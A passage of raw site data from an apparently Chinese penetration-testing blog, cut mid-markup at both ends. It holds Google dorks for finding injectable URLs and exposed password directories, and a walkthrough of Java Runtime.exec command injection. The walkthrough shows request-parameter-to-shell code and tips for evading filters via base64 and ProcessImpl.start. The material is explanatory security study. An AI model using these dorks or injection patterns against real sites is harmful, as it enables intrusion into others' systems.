github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Virustotal：https://www.virustotal.com/gui/home/upload&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;腾讯哈勃分析系统：https://habo.qq.com/tool/index&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;微步在线威胁情报：https://x.threatbook.cn/&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;奇安信威胁情报：https://ti.qianxin.com/&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;360威胁情报：https://ti.360.net/#/homepage&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;安恒威胁情报：https://ti.dbappsecurity.com.cn/&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;火线安全平台：https://www.huoxian.cn&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Hacking8安全信息流：https://i.hacking8.com/&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;零零信安：https://0.zone&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&quot;],&quot;metadata&quot;:[0,{&quot;headings&quot;:[1,[[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;云信息&quot;],&quot;text&quot;:[0,&quot;云信息&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;app反编译&quot;],&quot;text&quot;:[0,&quot;APP反编译&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;c段b段信息&quot;],&quot;text&quot;:[0,&quot;C段/B段信息&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;工具&quot;],&quot;text&quot;:[0,&quot;工具&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;网页缓存&quot;],&quot;text&quot;:[0,&quot;网页缓存&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;图片反查&quot;],&quot;text&quot;:[0,&quot;图片反查&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;githubgitee等代码托管平台&quot;],&quot;text&quot;:[0,&quot;Github/Gitee等代码托管平台&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;被入侵网址列表&quot;],&quot;text&quot;:[0,&quot;被入侵网址列表&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;amass-深入的击面映射和资产发现&quot;],&quot;text&quot;:[0,&quot;Amass 深入的击面映射和资产发现&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;威胁情报平台&quot;],&quot;text&quot;:[0,&quot;威胁情报平台&quot;]}]]],&quot;localImagePaths&quot;:[1,[]],&quot;remoteImagePaths&quot;:[1,[]],&quot;frontmatter&quot;:[0,{&quot;title&quot;:[0,&quot;一些情报源&quot;],&quot;date&quot;:[3,&quot;2026-01-18T10:36:58.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;渗透&quot;],[0,&quot;信息收集&quot;]]],&quot;categories&quot;:[0,&quot;Penetration&quot;]}],&quot;imagePaths&quot;:[1,[]]}]}],&quot;collection&quot;:[0,&quot;blog&quot;]}],&quot;href&quot;:[0,&quot;/blog/post/18&quot;]}],[0,{&quot;post&quot;:[0,{&quot;id&quot;:[0,&quot;penetration/google-hacking&quot;],&quot;data&quot;:[0,{&quot;title&quot;:[0,&quot;Google Hacking&quot;],&quot;date&quot;:[3,&quot;2026-01-03T10:36:58.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;渗透&quot;],[0,&quot;信息收集&quot;],[0,&quot;google&quot;]]],&quot;categories&quot;:[0,&quot;Penetration&quot;]}],&quot;body&quot;:[0,&quot;# **site:**\n\n功能：搜索指定的域名的网页内容，可以用来搜索子域名、跟此域名相关的内容。\n\n示例：\n\nsite:zhihu.com 搜索跟知乎相关的网页\n\n“web安全” site:zhihu.com 搜索zhihu.com跟web安全相关的网页  \n&lt;br/&gt;“sql注入” site:csdn.net 搜索csdn.net跟sql注入相关的网页\n\n# **filetype:**\n\n功能：搜索指定文件类型\n\n示例：\n```\n“web安全” filetype:pdf 搜索跟web安全相关的pdf文件\nnmap filetye:ppt 搜索跟nmap相关的ppt文件\nsite:csdn.net filetype:pdf 搜索csdn网站中的pdf文件\nfiletype:pdf site:www.51cto.com 搜索51cto的pdf文件\n```\n\n# **inurl:**\n\n功能：搜索url网址存在特定关键字的网页，可以用来搜索有注入点的网站\n\n示例：\n\ninurl:.php?id= 搜索网址中有\&quot;.php?id=\&quot;的网页\n\ninurl:view.php=? 搜索网址中有\&quot;view.php=\&quot;的网页\n\n# **intitle:**\n\n功能：搜索正文存在关键字的网页\n\n示例：\n\nintitle:后台登陆搜索网页标题是\&quot;后台登陆\&quot;的网页\n\nintitle:后台登陆 filetype:php 搜索网页标题是\&quot;后台登录\&quot;的php网页\n\nintitle:index of “keyword”搜索keyword相关的索引目录信息\n\nintitle:index of “password”搜索密码相关的索引目录信息\n\nintitle:index of “login”搜索登陆页面信息\n\n\\*\\*\n\n# intext：\n\n\\*\\*\n\n功能：搜索正文中存在关键字的页面\n\n示例：\n\nintext:Powered by wordpress 搜索wordpress制作的博客网址\n\nintext:Powered by \\*CMS 搜索\\*CMS相关的网页\n\nintext:powered by xxx inurl:login 搜索此类网址的后台登陆页面\n\n查找条件可混用，例如：intitle:管理页面 intext:“忘记密码”\n\n### **cache**\n\n搜索搜索引擎里关于某些内容的缓存，可能会在过期内容里发现有价值的信息\n\n网页快照，谷歌将返回给你他存储下来的历史页面，如果你同时制定了其他查询词，将在搜索结果里以高亮显示，例如：cache:www.hackingspirits.com guest ，将返回指定网站的缓存，并且正文中含有guest&quot;],&quot;filePath&quot;:[0,&quot;source/posts/Penetration/Google Hacking.md&quot;],&quot;digest&quot;:[0,&quot;476f56a824e08e39&quot;],&quot;rendered&quot;:[0,{&quot;html&quot;:[0,&quot;&lt;h1 id=\&quot;site\&quot;&gt;&lt;strong&gt;site:&lt;/strong&gt;&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#site\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;功能：搜索指定的域名的网页内容，可以用来搜索子域名、跟此域名相关的内容。&lt;/p&gt;\n&lt;p&gt;示例：&lt;/p&gt;\n&lt;p&gt;site:zhihu.com 搜索跟知乎相关的网页&lt;/p&gt;\n&lt;p&gt;“web安全” site:zhihu.com 搜索zhihu.com跟web安全相关的网页&lt;br&gt;\n&lt;br&gt;“sql注入” site:csdn.net 搜索csdn.net跟sql注入相关的网页&lt;/p&gt;\n&lt;h1 id=\&quot;filetype\&quot;&gt;&lt;strong&gt;filetype:&lt;/strong&gt;&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#filetype\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;功能：搜索指定文件类型&lt;/p&gt;\n&lt;p&gt;示例：&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;“web安全” filetype:pdf 搜索跟web安全相关的pdf文件&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap filetye:ppt 搜索跟nmap相关的ppt文件&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;site:csdn.net filetype:pdf 搜索csdn网站中的pdf文件&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;filetype:pdf site:www.51cto.com 搜索51cto的pdf文件&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;inurl\&quot;&gt;&lt;strong&gt;inurl:&lt;/strong&gt;&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#inurl\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;功能：搜索url网址存在特定关键字的网页，可以用来搜索有注入点的网站&lt;/p&gt;\n&lt;p&gt;示例：&lt;/p&gt;\n&lt;p&gt;inurl:.php?id= 搜索网址中有”.php?id=“的网页&lt;/p&gt;\n&lt;p&gt;inurl:view.php=? 搜索网址中有”view.php=“的网页&lt;/p&gt;\n&lt;h1 id=\&quot;intitle\&quot;&gt;&lt;strong&gt;intitle:&lt;/strong&gt;&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#intitle\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;功能：搜索正文存在关键字的网页&lt;/p&gt;\n&lt;p&gt;示例：&lt;/p&gt;\n&lt;p&gt;intitle:后台登陆搜索网页标题是”后台登陆”的网页&lt;/p&gt;\n&lt;p&gt;intitle:后台登陆 filetype:php 搜索网页标题是”后台登录”的php网页&lt;/p&gt;\n&lt;p&gt;intitle:index of “keyword”搜索keyword相关的索引目录信息&lt;/p&gt;\n&lt;p&gt;intitle:index of “password”搜索密码相关的索引目录信息&lt;/p&gt;\n&lt;p&gt;intitle:index of “login”搜索登陆页面信息&lt;/p&gt;\n&lt;p&gt;**&lt;/p&gt;\n&lt;h1 id=\&quot;intext\&quot;&gt;intext：&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#intext\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;**&lt;/p&gt;\n&lt;p&gt;功能：搜索正文中存在关键字的页面&lt;/p&gt;\n&lt;p&gt;示例：&lt;/p&gt;\n&lt;p&gt;intext:Powered by wordpress 搜索wordpress制作的博客网址&lt;/p&gt;\n&lt;p&gt;intext:Powered by *CMS 搜索*CMS相关的网页&lt;/p&gt;\n&lt;p&gt;intext:powered by xxx inurl:login 搜索此类网址的后台登陆页面&lt;/p&gt;\n&lt;p&gt;查找条件可混用，例如：intitle:管理页面 intext:“忘记密码”&lt;/p&gt;\n&lt;h3 id=\&quot;cache\&quot;&gt;&lt;strong&gt;cache&lt;/strong&gt;&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#cache\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;搜索搜索引擎里关于某些内容的缓存，可能会在过期内容里发现有价值的信息&lt;/p&gt;\n&lt;p&gt;网页快照，谷歌将返回给你他存储下来的历史页面，如果你同时制定了其他查询词，将在搜索结果里以高亮显示，例如：cache:&lt;a href=\&quot;http://www.hackingspirits.com\&quot;&gt;www.hackingspirits.com&lt;/a&gt; guest ，将返回指定网站的缓存，并且正文中含有guest&lt;/p&gt;&quot;],&quot;metadata&quot;:[0,{&quot;headings&quot;:[1,[[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;site&quot;],&quot;text&quot;:[0,&quot;site:&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;filetype&quot;],&quot;text&quot;:[0,&quot;filetype:&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;inurl&quot;],&quot;text&quot;:[0,&quot;inurl:&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;intitle&quot;],&quot;text&quot;:[0,&quot;intitle:&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;intext&quot;],&quot;text&quot;:[0,&quot;intext：&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;cache&quot;],&quot;text&quot;:[0,&quot;cache&quot;]}]]],&quot;localImagePaths&quot;:[1,[]],&quot;remoteImagePaths&quot;:[1,[]],&quot;frontmatter&quot;:[0,{&quot;title&quot;:[0,&quot;Google Hacking&quot;],&quot;date&quot;:[3,&quot;2026-01-03T10:36:58.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;渗透&quot;],[0,&quot;信息收集&quot;],[0,&quot;google&quot;]]],&quot;categories&quot;:[0,&quot;Penetration&quot;]}],&quot;imagePaths&quot;:[1,[]]}]}],&quot;collection&quot;:[0,&quot;blog&quot;]}],&quot;href&quot;:[0,&quot;/blog/post/14&quot;]}],[0,{&quot;post&quot;:[0,{&quot;id&quot;:[0,&quot;penetration/java奇怪的命令执行&quot;],&quot;data&quot;:[0,{&quot;title&quot;:[0,&quot;JAVA奇怪的命令执行&quot;],&quot;date&quot;:[3,&quot;2026-01-03T10:36:58.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;渗透&quot;],[0,&quot;java&quot;],[0,&quot;漏洞&quot;]]],&quot;categories&quot;:[0,&quot;Penetration&quot;]}],&quot;body&quot;:[0,&quot;# 前言\n首先Java下的命令执行大家都知道常见的两种方式：\n* 使用ProcessBuilder\n```\nProcessBuilder pb=new ProcessBuilder(cmd);\npb.start();\n```\n* 使用Runtime\n```\nRuntime.getRuntime().exec(cmd)\n```\n也就是说上面cmd参数可控的情况下，均存在命令执行的问题。但是话题回来，不太清楚大家是否遇到过java命令执行的时候，无论是windows还是linux环境下，带有|,&amp;lt;,&amp;gt;等符号的命令没办法正常执行。所以今天就进入底层看看这两个东西。\n\n# 差别\n先选择跟进\n```\nRuntime.getRuntime().exec(cmd)\n```\n样例代码如下所示：\n```java\nimport java.io.*;\n\npublic class Main {\n    public static void main(String[] arg) throws IOException {\n        String command=\&quot;/bin/sh -c echo 111 &gt; 3.txt\&quot;;\n        Process proc = Runtime.getRuntime().exec(command);\n        InputStream in = proc.getInputStream();\n        BufferedReader br = new BufferedReader(new InputStreamReader(in, \&quot;UTF8\&quot;));\n        String line = null;\n        while((line=br.readLine())!=null) {\n            System.out.println(line);\n        }\n    }\n}\n```\n跟进 java.lang.Runtime#exec 的构造方法，这里要感谢phith0n师傅提出的疑问，让我补充完整这篇文章，下面话题回来，exec的构造方法有以下几种情况，其实根据传入的变量我们大概可以区分的了，一个是根据String command，也就是直接传入一个字符串。另一个是根据String cmdarray\\[\\]，也就是传入一个数组。\n\n```java\npublic Process exec(String command) throws IOException {        \n    return exec(command, null, null);\n    }\npublic Process exec(String command, String[] envp) throws IOException {        \n    return exec(command, envp, null);\n    }\npublic Process exec(String cmdarray[]) throws IOException {\n        return exec(cmdarray, null, null);\n     }\npublic Process exec(String[] cmdarray, String[] envp) throws IOException {        \n    return exec(cmdarray, envp, null);\n        }\n```\n\n而根据前面代码中，我们传入的命令是如下所示：\n```\nString command=\&quot;/bin/sh -c echo 111 &gt; 3.txt\&quot;;\n```\n\n所以会进入\n```\nProcess exec(String command)\n```\n这个构造方法进行处理，跟进这个方法，发现最后返回\n```\nexec(command, null, null)\npublic Process exec(String command) throws IOException {        return exec(command, null, null);    }\n```\n继续跟进这个exec方法，看看这个方法的实现。这里代码实例化了StringTokenizer类，并且传入了我们要执行的command命令，简单翻译一下注释：为指定的字符串构造一个字符串标记器。也就是说StringTokenizer这个类会为特殊字符打上tag之类的东西。\n![](img/22.png)\n我们继续往下看，经过StringTokenizer类处理之后会返回一个cmdarray\\[\\]，而这里的处理实际上是根据空格针对命令进行了分割，至于为什么结果要是一个array数组，我们下面会接着说。\n\n![](img/23.png)\n我们发现经过一系列的处理，最后又有一个return exec 的处理。继续跟进这个exec的处理，我们可以看到这里最后实例化ProcessBuilder来处理我们传入的cmdarray。到这里实际上可以清楚了Runtime.getRuntime().exec()的底层实际上也是ProcessBuilder。\n```\npublic Process exec(String\\[\\] cmdarray, String\\[\\] envp, File dir)\n       throws IOException {\n       return new ProcessBuilder(cmdarray)\n          .environment(envp)\n           .directory(dir)\n           .start();\n   }\n```\n\n我们知道ProcessBuilder.start方法是命令执行，那么跟进这个start我们发现，首先prog获取cmdarray[0]也就是我们的/bin/sh，然后判断security是否为null，如果不为null就会校验checkExec。\n\n然后继续往下走，这里调用java.lang.ProcessImpl.start。\n\n进入之后我们就可以看到最后是调用java.lang.UnixProcess这个类来执行命令，而且我们发现执行命令的时候实际上是根据cmdarray[0]来判断用什么命令。而在java.lang.UnixProcess这个类里面是调用forkAndExec来为命令创建环境等操作。我们看到当前断点pid是2653，而这里确实起了一个sh的进程。\n\n这样看可能还不够明显，因为我们知道/bin/sh -c echo 111 &gt; 3.txt在bash命令行下也不会正常执行成功，命令行下需要/bin/sh -c \&quot;echo 111 &gt; 3.txt\&quot;，看这两段代码的命令执行的效果。\n```\nString\\[\\] command = { \&quot;/bin/sh\&quot;, \&quot;-c\&quot;, \&quot;echo 111 &gt; 3.txt\&quot; };String command=\&quot;/bin/sh -c \\\\\&quot;echo 111 &gt; 3.txt\\\\\&quot;\&quot;;\n```\n首先先看\n`String command=\&quot;/bin/sh -c \\\\\&quot;echo 111 &gt; 3.txt\\\\\&quot;\&quot;;`\n按照前面的分析，经过StringTokenizer这个类进行拆分之后变成了{\&quot;/bin/sh\&quot;,\&quot;-c\&quot;,\&quot;\&quot;echo\&quot;,\&quot;111\&quot;、\&quot;&gt;\&quot;,\&quot;3.txt\&quot;\&quot;}。\n\n而当前内存开辟一个12473进程，并且确实12473执行sh命令。\n\n但是我们发现，经过StringTokenizer这类拆分之后，命令完全变了一个味道，语义完全变了，并不是我们想要的结果，那我们再看看\n```\nString\\[\\] command = { \&quot;/bin/sh\&quot;, \&quot;-c\&quot;, \&quot;echo 111 &gt; 3.txt\&quot; };\n```\n的结果。因为我们传入的是array数组类型，这里直接将命令直接带入了ProcessBuilder进行处理，前面完全没有经过StringTokenizer这个类的拆分。也就是他完整的保存了我想要的语义。\n\n也就是说getRuntime().exec()如果直接传入字符串会经过StringTokenizer的分割，进而破坏其原本想要表达的意思。\n\n下面这段代码是否存在命令执行的问题，要是在PHP下，我会斩钉截铁的说是，但是回到java环境下，我们发现 | 等一些特殊符号没办法使用，而且传入的是字符串，遇到空格会被StringTokenizer进行切割，所以实际上下面这段代码是没办法使用的。\n```\nString str = request.getParameter(\&quot;url\&quot;);\nString cmdstr = \&quot;ping \&quot;+ url;Runtime.getRuntime().exec(cmdstr)\n```\n再来一段代码，能够执行命令，但是很受限，我们知道命令根据cmdarray[0]来确认以什么命令环境启动，这里确实以/bin/sh启动了，但是后面的命令执行的时候存在问题，它仅能执行单条命令，拼接不了相关参数。\n```\nString str = request.getParameter(\&quot;cmd\&quot;);\nString cmdstr = \&quot;/bin/sh -c \&quot;+ cmd;Runtime.getRuntime().exec(cmdstr)\n```\n最后再来一段代码，下面这段代码才会是java下命令执行的完全体。\n```\nString str = request.getParameter(\&quot;cmd\&quot;);\nString\\[\\] cmdstr = { \&quot;/bin/sh\&quot;, \&quot;-c\&quot;, str };Runtime.getRuntime().exec(cmdstr)\n```\n后面我翻到一篇文章，实际上也是差不多这个情况，实际上也是这个StringTokenizer这个类针对命令进行处理可能会造成非预期的结果。\n\n最后还有一个问题，为什么一定要将命令切割成为数组，原因是因为ProcessBuilder，看看他的构造方法。\n```\npublic ProcessBuilder(String... command) {        \n    this.command = new ArrayList&lt;&gt;(command.length);        \n    for (String arg : command)            \n    this.command.add(arg);\n   }\npublic ProcessBuilder(List&amp;lt;String&amp;gt; command) {\n    if (command == null)\n    throw new NullPointerException();\n    this.command = command;\n\n   }\n```\n实际上它是要求 Array 类型或者 List 类型，如果我们要执行下图中的代码是不行的。\n\n原因在于我们传入的类型不对，我们前面说过命令执行是根据cmdarray[0]，确认命令启动环境，这里自然找不到我们要启动的命令。\n\n所以Java下的命令稍微改造一下代码就好。\n\n还有一种方式就是用编码，linux下可以用bash的base64编码来解决这个特殊字符的问题。\n\n![](img/24.png)\n这里在小提一下如果遇到命令执行过滤了ProcessBuilder和getRuntime，可以考虑一下java.lang.ProcessImpl.start\n\n# 小结\n\n其实java已经尽量规避命令执行的安全问题，JDK沙盒机制会进行checkExec，执行命令的机制就是仅仅检查并执行命令数组中的第一个，而分隔符后面的所有东西都是默认为被执行程序的参数，而分隔符后面的所有东西都是默认为被执行程序的参数，这也是我们前文一直聊的内容。所以getRuntime().exec()通过传入字符串执行命令的时候，应该尽量避免使用空格，用了空格可能会改变这条命令本身想要表达的意思。\n\n所以在java下如果遇到复杂的命令执行，且参数只能如下所示，且只有一个位置可以控制的话，建议使用base64的编码方式，windows下可以使用powershell的base64。\n\njava的反序列化框架利用框架yso，以及一些shiro这类反序列化导致的命令执行实际上很多是用了getRuntime来达到命令执行的目的，且就像我们上面说的，可控位置比较固定，执行复杂命令会出现执行不了。&quot;],&quot;filePath&quot;:[0,&quot;source/posts/Penetration/JAVA奇怪的命令执行.md&quot;],&quot;assetImports&quot;:[1,[[0,&quot;img/22.png&quot;],[0,&quot;img/23.png&quot;],[0,&quot;img/24.png&quot;]]],&quot;digest&quot;:[0,&quot;d35953b4d44114a7&quot;],&quot;rendered&quot;:[0,{&quot;html&quot;:[0,&quot;&lt;h1 id=\&quot;前言\&quot;&gt;前言&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#前言\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;首先Java下的命令执行大家都知道常见的两种方式：&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;使用ProcessBuilder&lt;/li&gt;\n&lt;/ul&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;ProcessBuilder pb=new ProcessBuilder(cmd);&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;pb.start();&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;ul&gt;\n&lt;li&gt;使用Runtime&lt;/li&gt;\n&lt;/ul&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Runtime.getRuntime().exec(cmd)&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;也就是说上面cmd参数可控的情况下，均存在命令执行的问题。但是话题回来，不太清楚大家是否遇到过java命令执行的时候，无论是windows还是linux环境下，带有|,&amp;#x3C;,&gt;等符号的命令没办法正常执行。所以今天就进入底层看看这两个东西。&lt;/p&gt;\n&lt;h1 id=\&quot;差别\&quot;&gt;差别&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#差别\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;先选择跟进&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Runtime.getRuntime().exec(cmd)&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;样例代码如下所示：&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;java\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;import&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt; java.io.&lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt;*&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;public&lt;/span&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt; class&lt;/span&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt; Main&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt; {&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;    public&lt;/span&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt; static&lt;/span&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt; void&lt;/span&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt; main&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;(&lt;/span&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;String&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;[] &lt;/span&gt;&lt;span style=\&quot;color:#E36209;--shiki-dark:#FFAB70\&quot;&gt;arg&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;) &lt;/span&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;throws&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt; IOException {&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;        String command&lt;/span&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;=&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt;\&quot;/bin/sh -c echo 111 &gt; 3.txt\&quot;&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;        Process proc &lt;/span&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;=&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt; Runtime.&lt;/span&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;getRuntime&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;().&lt;/span&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;exec&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;(command);&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;        InputStream in &lt;/span&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;=&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt; proc.&lt;/span&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;getInputStream&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;();&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;        BufferedReader br &lt;/span&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;=&lt;/span&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt; new&lt;/span&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt; 